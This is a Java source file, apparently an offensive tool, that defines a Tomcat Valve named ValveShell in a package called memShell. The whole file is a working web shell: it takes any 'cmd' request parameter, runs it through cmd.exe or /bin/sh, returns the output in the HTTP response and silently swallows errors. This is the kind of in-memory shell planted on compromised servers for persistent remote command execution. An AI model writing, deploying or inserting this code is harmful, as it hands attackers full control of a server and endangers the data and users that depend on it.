package memShell;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.IOException;

public class ValveShell extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String code = request.getParameter("cmd");
        if (code != null) {
            try {
                java.io.PrintWriter writer = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", code});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", code});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } catch (Exception e) {
            }
        }
    }
}
